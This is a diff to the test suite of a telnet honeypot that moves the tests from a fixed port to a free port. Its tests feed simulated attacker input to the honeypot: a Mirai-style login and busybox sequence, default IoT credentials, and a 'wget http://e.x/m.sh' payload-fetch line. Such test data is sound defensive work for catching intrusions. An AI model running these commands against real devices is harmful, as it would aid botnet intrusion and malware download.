@@ -12,7 +12,6 @@ load "./shell"
 load "./recorder"
 load "./server"
 
-let PORT = 62323
 let WAIT_MS = 2000
 
 let IAC = chr(255)
@@ -674,15 +673,15 @@ fn input_of(evs)
   string.join(table.map(table.filter(evs, fn(e) e.kind == "input" end), fn(e) e.bytes end), "")
 end
 
-# Runs `body` against a server on PORT that sends its events to this
-# process, unless `opts` has `data`, the recorder's directory.
+# Runs `body(port)` against a server on a free port that sends its events
+# to this process, unless `opts` has `data`, the recorder's directory.
 fn with_server(opts, body)
-  let listener = tcp_listen("127.0.0.1", PORT)
+  let listener = tcp_listen("127.0.0.1", 0)
   if not has_key(opts, "data")
     opts.events = self()
   end
   let sup = server.start(listener, opts)
-  let r = pcall body()
+  let r = pcall body(tcp_local_port(listener))
   server.stop(sup)
   tcp_close(listener)
   if not r.ok
@@ -691,8 +690,8 @@ fn with_server(opts, body)
 end
 
 test.case("tcp: a session from login to exit") do
-  with_server({accept_on: 1, accept_chance: 0.0}) do
-    let sock = tcp_connect("127.0.0.1", PORT)
+  with_server({accept_on: 1, accept_chance: 0.0}) do |port|
+    let sock = tcp_connect("127.0.0.1", port)
     let sent = 0
     let all_sent = ""
     let say = fn(text)
@@ -731,8 +730,8 @@ test.case("tcp: a session from login to exit") do
 end
 
 test.case("tcp: a bot that ignores negotiation and sends it all at once") do
-  with_server({accept_on: 1, accept_chance: 0.0}) do
-    let sock = tcp_connect("127.0.0.1", PORT)
+  with_server({accept_on: 1, accept_chance: 0.0}) do |port|
+    let sock = tcp_connect("127.0.0.1", port)
     read_until(sock, "login: ")
     tcp_write(sock, "admin\r\nadmin\r\nenable\r\nsystem\r\nshell\r\nsh\r\n/bin/busybox MIRAI\r\n", 1000)
     let out = read_until(sock, "MIRAI: applet not found\r\n# ")
@@ -745,14 +744,14 @@ test.case("tcp: a bot that ignores negotiation and sends it all at once") do
 end
 
 test.case("tcp: idle clients and clients that leave at once") do
-  with_server({idle_ms: 100}) do
-    let sock = tcp_connect("127.0.0.1", PORT)
+  with_server({idle_ms: 100}) do |port|
+    let sock = tcp_connect("127.0.0.1", port)
     read_until(sock, "login: ")
     test.assert_eq(tcp_read(sock, 4096, WAIT_MS), "")
     tcp_close(sock)
     let evs = session_events()
     test.assert_eq([evs[1].reason, evs[1].logged_in], ["idle", false])
-    let quick = tcp_connect("127.0.0.1", PORT)
+    let quick = tcp_connect("127.0.0.1", port)
     tcp_close(quick)
     let ends = session_events()
     test.assert(ends[len(ends) - 1].reason == "closed" or ends[len(ends) - 1].reason == "write_failed")
@@ -760,8 +759,8 @@ test.case("tcp: idle clients and clients that leave at once") do
 end
 
 test.case("tcp: an endless line and an endless subnegotiation stay capped") do
-  with_server({max_line: 1000, max_subneg: 100, max_bytes: 4194304}) do
-    let sock = tcp_connect("127.0.0.1", PORT)
+  with_server({max_line: 1000, max_subneg: 100, max_bytes: 4194304}) do |port|
+    let sock = tcp_connect("127.0.0.1", port)
     read_until(sock, "login: ")
     let junk = string.repeat("A", 65536)
     for i = 0, 16
@@ -778,9 +777,9 @@ test.case("tcp: an endless line and an endless subnegotiation stay capped") do
 end
 
 test.case("tcp: the server serves old and new connections after a registry crash") do
-  with_server({}) do
+  with_server({}) do |port|
     let old = whereis("honeypot_registry")
-    let sock = tcp_connect("127.0.0.1", PORT)
+    let sock = tcp_connect("127.0.0.1", port)
     read_until(sock, "login: ")
     kill(old, "boom")
     let deadline = time_ms() + WAIT_MS
@@ -792,7 +791,7 @@ test.case("tcp: the server serves old and new connections after a registry crash
     test.assert_eq(read_until(sock, "Password: "), "Password: ")
     tcp_close(sock)
     session_events()
-    let again = tcp_connect("127.0.0.1", PORT)
+    let again = tcp_connect("127.0.0.1", port)
     test.assert(string.ends_with(read_until(again, "login: "), "login: "))
     tcp_close(again)
     let evs = session_events()
@@ -814,26 +813,26 @@ fn refusal()
 end
 
 test.case("tcp: caps on live sessions, in all and per IP") do
-  with_server({max_sessions: 1}) do
-    let first = tcp_connect("127.0.0.1", PORT)
+  with_server({max_sessions: 1}) do |port|
+    let first = tcp_connect("127.0.0.1", port)
     read_until(first, "login: ")
-    let second = tcp_connect("127.0.0.1", PORT)
+    let second = tcp_connect("127.0.0.1", port)
     test.assert_eq(tcp_read(second, 4096, WAIT_MS), "")
     tcp_close(second)
     test.assert_eq(refusal(), ["max_sessions", "127.0.0.1"])
     tcp_close(first)
     session_events()
-    let third = tcp_connect("127.0.0.1", PORT)
+    let third = tcp_connect("127.0.0.1", port)
     test.assert(string.ends_with(read_until(third, "login: "), "login: "))
     tcp_close(third)
     session_events()
   end
-  with_server({max_per_ip: 2}) do
-    let a = tcp_connect("127.0.0.1", PORT)
-    let b = tcp_connect("127.0.0.1", PORT)
+  with_server({max_per_ip: 2}) do |port|
+    let a = tcp_connect("127.0.0.1", port)
+    let b = tcp_connect("127.0.0.1", port)
     read_until(a, "login: ")
     read_until(b, "login: ")
-    let c = tcp_connect("127.0.0.1", PORT)
+    let c = tcp_connect("127.0.0.1", port)
     test.assert_eq(tcp_read(c, 4096, WAIT_MS), "")
     tcp_close(c)
     test.assert_eq(refusal(), ["max_per_ip", "127.0.0.1"])
@@ -845,8 +844,8 @@ test.case("tcp: caps on live sessions, in all and per IP") do
 end
 
 test.case("tcp: caps end a session that lasts, sends or tries too much") do
-  with_server({max_session_ms: 300, idle_ms: 5000}) do
-    let sock = tcp_connect("127.0.0.1", PORT)
+  with_server({max_session_ms: 300, idle_ms: 5000}) do |port|
+    let sock = tcp_connect("127.0.0.1", port)
     read_until(sock, "login: ")
     let started = time_ms()
     let ended = false
@@ -860,16 +859,16 @@ test.case("tcp: caps end a session that lasts, sends or tries too much") do
     test.assert_eq(caps_of(evs), ["max_time"])
     test.assert_eq(evs[len(evs) - 1].reason, "max_time")
   end
-  with_server({max_session_ms: 200, idle_ms: 100000}) do
-    let sock = tcp_connect("127.0.0.1", PORT)
+  with_server({max_session_ms: 200, idle_ms: 100000}) do |port|
+    let sock = tcp_connect("127.0.0.1", port)
     read_until(sock, "login: ")
     test.assert_eq(tcp_read(sock, 4096, WAIT_MS), "")
     tcp_close(sock)
     let evs = session_events()
     test.assert_eq([evs[1].cap, evs[2].reason], ["max_time", "max_time"])
   end
-  with_server({max_bytes: 1000}) do
-    let sock = tcp_connect("127.0.0.1", PORT)
+  with_server({max_bytes: 1000}) do |port|
+    let sock = tcp_connect("127.0.0.1", port)
     read_until(sock, "login: ")
     tcp_write(sock, string.repeat("root\r\n", 200), 1000)
     read_to_end(sock)
@@ -878,8 +877,8 @@ test.case("tcp: caps end a session that lasts, sends or tries too much") do
     test.assert_eq(caps_of(evs), ["max_bytes"])
     test.assert_eq([evs[len(evs) - 1].reason, evs[len(evs) - 1].bytes_in], ["max_bytes", 1200])
   end
-  with_server({accept_on: 5, accept_chance: 0.0, max_logins: 2}) do
-    let sock = tcp_connect("127.0.0.1", PORT)
+  with_server({accept_on: 5, accept_chance: 0.0, max_logins: 2}) do |port|
+    let sock = tcp_connect("127.0.0.1", port)
     read_until(sock, "login: ")
     tcp_write(sock, "root\r\na\r\nroot\r\nb\r\nroot\r\n", 1000)
     test.assert(string.ends_with(read_until(sock, "Login incorrect\r\n"), "Password: \r\nLogin incorrect\r\n"))
@@ -889,8 +888,8 @@ test.case("tcp: caps end a session that lasts, sends or tries too much") do
     test.assert_eq(kinds(evs), ["session_start", "login", "login", "cap", "session_end"])
     test.assert_eq([evs[3].cap, evs[4].reason], ["max_logins", "max_logins"])
   end
-  with_server({accept_on: 1, accept_chance: 0.0, max_commands: 2}) do
-    let sock = tcp_connect("127.0.0.1", PORT)
+  with_server({accept_on: 1, accept_chance: 0.0, max_commands: 2}) do |port|
+    let sock = tcp_connect("127.0.0.1", port)
     read_until(sock, "login: ")
     tcp_write(sock, "root\r\npw\r\nid\r\nps\r\nuname\r\n", 1000)
     read_to_end(sock)
@@ -929,8 +928,8 @@ end
 
 test.case("tcp: the recorder stores sessions, crashes and their input") do
   with_dir do |dir|
-    with_server({data: dir, accept_on: 1, accept_chance: 0.0}) do
-      let sock = tcp_connect("127.0.0.1", PORT)
+    with_server({data: dir, accept_on: 1, accept_chance: 0.0}) do |port|
+      let sock = tcp_connect("127.0.0.1", port)
       read_until(sock, "login: ")
       let typed = "root\r\nvizxv\r\nwget http://e.x/m.sh\r\nexit\r\n"
       tcp_write(sock, typed, 1000)
@@ -942,7 +941,7 @@ test.case("tcp: the recorder stores sessions, crashes and their input") do
       let input = rows(recorder.sync("honeypot_recorder"), "SELECT group_concat(bytes, '') AS b FROM input WHERE session_id = {s[0].id}")
       test.assert_eq(input[0].b, typed)
 
-      let idle = tcp_connect("127.0.0.1", PORT)
+      let idle = tcp_connect("127.0.0.1", port)
       read_until(idle, "login: ")
       tcp_write(idle, "ad", 1000)
       let live = await_rows("SELECT pid FROM sessions WHERE end_reason IS NULL", 1)
@@ -957,8 +956,8 @@ end
 
 test.case("tcp: a session that raises is stored with its trace and input") do
   with_dir do |dir|
-    with_server({data: dir, accept_on: "not a number"}) do
-      let sock = tcp_connect("127.0.0.1", PORT)
+    with_server({data: dir, accept_on: "not a number"}) do |port|
+      let sock = tcp_connect("127.0.0.1", port)
       read_until(sock, "login: ")
       let sent = "root\r\n" + chr(0) + chr(255) + chr(255) + "pw\r\n"
       tcp_write(sock, sent, 1000)
@@ -975,8 +974,8 @@ end
 
 test.case("tcp: a killed recorder restarts and takes the live sessions over") do
   with_dir do |dir|
-    with_server({data: dir, accept_on: 1, accept_chance: 0.0}) do
-      let sock = tcp_connect("127.0.0.1", PORT)
+    with_server({data: dir, accept_on: 1, accept_chance: 0.0}) do |port|
+      let sock = tcp_connect("127.0.0.1", port)
       read_until(sock, "login: ")
       tcp_write(sock, "root\r\n", 1000)
       read_until(sock, "Password: ")
@@ -1002,8 +1001,8 @@ end
 
 test.case("tcp: the sampler records the metrics") do
   with_dir do |dir|
-    with_server({data: dir, metrics_ms: 50, commit: "test"}) do
-      let sock = tcp_connect("127.0.0.1", PORT)
+    with_server({data: dir, metrics_ms: 50, commit: "test"}) do |port|
+      let sock = tcp_connect("127.0.0.1", port)
       read_until(sock, "login: ")
       let deadline = time_ms() + WAIT_MS
       let m = []
